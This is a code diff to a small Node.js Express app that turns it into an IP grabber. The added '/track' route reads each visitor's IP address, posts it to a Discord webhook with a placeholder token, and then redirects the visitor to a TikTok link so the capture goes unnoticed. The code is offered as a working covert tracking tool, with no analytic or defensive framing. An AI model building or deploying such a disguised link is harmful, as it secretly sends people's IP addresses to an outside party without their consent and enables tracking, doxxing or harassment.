@@ -1,26 +1,6 @@
 const express = require('express');
 const app = express();
 
-async function sendToDiscord(webhookUrl, content) {
-    const response = await fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            content: content
-        })
-    });
-
-    if (!response.ok) {
-        throw new Error(`Discord webhook failed: ${response.status}`);
-    }
-
-    console.log("Message sent to Discord.");
-}
-
-
-
 async function sendCapturedIp(webhookUrl, viewerIp) {
     const response = await fetch(webhookUrl, {
         method: "POST",
@@ -37,8 +17,14 @@ async function sendCapturedIp(webhookUrl, viewerIp) {
     }
 }
 
+app.get('/track', (req, res) => {
+    const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-sendCapturedIp(
-    "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
-    viewerIp
-).catch(console.error);
+    sendCapturedIp(
+        "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+        viewerIp
+    ).catch(console.error);
+
+    // Redirect the user to a normal website
+    res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
+});
